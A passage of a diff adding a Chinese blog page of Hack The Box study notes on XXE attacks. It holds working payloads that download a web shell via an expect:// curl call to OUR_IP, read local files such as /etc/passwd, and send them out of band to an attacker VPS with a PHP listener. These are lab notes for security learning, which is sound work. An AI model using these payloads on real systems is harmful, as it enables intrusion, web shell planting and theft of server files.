+<li>构造XXE，使其下载马（使用<code>$IFS</code>等避免破坏XML语法）  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://curl$IFS-O$IFS&#x27;OUR_IP/shell.php&#x27;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span><span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;company;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>之后访问shell.php即可</li>
+</ul>
+</li>
+</ul>
+<h3 id="使用XXE来SSRF"><a href="#使用XXE来SSRF" class="headerlink" title="使用XXE来SSRF"></a>使用XXE来SSRF</h3><h3 id="使用CDATA-及-XML参数实体（XML-Parameter-Entities）"><a href="#使用CDATA-及-XML参数实体（XML-Parameter-Entities）" class="headerlink" title="使用CDATA 及 XML参数实体（XML Parameter Entities）"></a>使用CDATA 及 XML参数实体（XML Parameter Entities）</h3><blockquote>
+<p>在XML中，CDATA（Character Data，字符数据）是一种用于表示原始文本数据的方式，告诉XML解析器该段数据不应被解析为XML标记。CDATA块中的内容会被解析器忽略为普通字符，而不是作为XML标签或实体处理。</p>
+</blockquote>
+<blockquote>
+<p>要输出不符合 XML 格式的数据，我们可以用 CDATA 标记（如 <code>&lt;![CDATA[ FILE_CONTENT ]]&gt;</code>）来封装外部文件引用的内容。这样，XML 解析器就会认为这部分是原始数据，可以包含任何类型的数据，包括任何特殊字符。</p>
+</blockquote>
+<p>给靶机的request：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">begin</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> &lt;!-- prepend the beginning of the CDATA tag --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/submitDetails.php&quot;</span>&gt;</span> &lt;!-- reference external file --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span> &lt;!-- append the end of the CDATA tag --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://OUR_IP:8000/xxe.dtd&quot;</span>&gt;</span> &lt;!-- reference our external DTD --&gt;</span></span><br><span class="line"><span class="meta">  %xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;joined;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span> <span class="comment">&lt;!-- reference the &amp;joined; entity to print the file content --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>恶意VPS上的evil.dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">joined</span> <span class="string">&quot;%begin;%file;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>原理是，joined 实体将 begin（CDATA 开始）、file（文件内容）和 end（CDATA 结束）组合在一起。当解析器遇到 <code>&amp;joined;</code> 时，它实际上会将其解析为：<code>&lt;![CDATA[文件内容]]&gt;</code></li>
+</ul>
+<h3 id="XXE盲注-基于错误的注入"><a href="#XXE盲注-基于错误的注入" class="headerlink" title="XXE盲注 &#x2F; 基于错误的注入"></a>XXE盲注 &#x2F; 基于错误的注入</h3><p>可以通过删除XML标签诱导报错，然后通过返回的内容得知web根目录路径等内容</p>
+<p>首先，VPS托管一个dtd文件<code>xxeerror.dtd</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hosts&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">error</span> <span class="string">&quot;&lt;!ENTITY content SYSTEM &#x27;%nonExistingEntity;/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当报错时，%nonExistingEntity;是不存在的，但是同样会引入%file;实体。</p>
+<p>这个时候在抓包改包或者输入其他payload的时候引入外部实体即可</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [ </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://10.10.16.223:9999/xxeerror.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %remote;</span></span><br><span class="line"><span class="meta">  %error;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span>321321<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>2@2.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>321321<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h3><p>OOB（out-of-band）数据传输的一种方式：</p>
+<h4 id="基于HTTP"><a href="#基于HTTP" class="headerlink" title="基于HTTP"></a>基于HTTP</h4><p>使用HTTP GET方式把内容带出来，在VPS上创一个dtd文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">oob</span> <span class="string">&quot;&lt;!ENTITY content SYSTEM &#x27;http://OUR_IP:8000/?content=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>VPS端创一个HTTP Server（使用PHP）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;\n\n&quot;</span> . <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接开始这个Server即可<code>php -S 0.0.0.0:8000</code>；</p>
+<p>然后发送payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [ </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://OUR_IP:8000/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %remote;</span></span><br><span class="line"><span class="meta">  %oob;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;content;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="基于DNS"><a href="#基于DNS" class="headerlink" title="基于DNS"></a>基于DNS</h4><p>也可基于DNS带出来</p>
+<h4 id="自动外带XXE"><a href="#自动外带XXE" class="headerlink" title="自动外带XXE"></a>自动外带XXE</h4><p>使用XXEINJECT工具</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-ATTACKS"><span class="toc-number">1.</span> <span class="toc-text">WEB ATTACKS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E6%96%B9%E6%B3%95%E7%AF%A1%E6%94%B9-HTTP-Verb-Tampering"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP方法篡改(HTTP Verb Tampering)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8OPTIONS%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%81%E8%AE%B8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">使用OPTIONS查看目标服务器允许的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9C%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%E2%80%9D-Insecure-Direct-Object-References-IDOR"><span class="toc-number">1.2.</span> <span class="toc-text">“不安全的直接对象引用”(Insecure Direct Object References, IDOR)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">枚举文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%BB%E5%BA%A6hash%EF%BC%9AJS%E9%80%86%E5%90%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">轻度hash：JS逆向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-XXE"><span class="toc-number">1.3.</span> <span class="toc-text">XML外部实体注入(XXE)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84XXE%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">简单的XXE测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8XXE-RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">使用XXE RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8XXE%E6%9D%A5SSRF"><span class="toc-number">1.3.3.</span> <span class="toc-text">使用XXE来SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8CDATA-%E5%8F%8A-XML%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%EF%BC%88XML-Parameter-Entities%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">使用CDATA 及 XML参数实体（XML Parameter Entities）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.5.</span> <span class="toc-text">XXE盲注 &#x2F; 基于错误的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.6.</span> <span class="toc-text">XXE盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EHTTP"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">基于HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EDNS"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">基于DNS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%A4%96%E5%B8%A6XXE"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">自动外带XXE</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/23/HTB-22-WEBATTACKS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&text=HTB渗透学习-WEBATTACKS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&is_video=false&description=HTB渗透学习-WEBATTACKS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB渗透学习-WEBATTACKS&body=Check out this article: http://example.com/2024/09/23/HTB-22-WEBATTACKS/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&title=HTB渗透学习-WEBATTACKS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&name=HTB渗透学习-WEBATTACKS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/23/HTB-22-WEBATTACKS/&t=HTB渗透学习-WEBATTACKS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2025
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
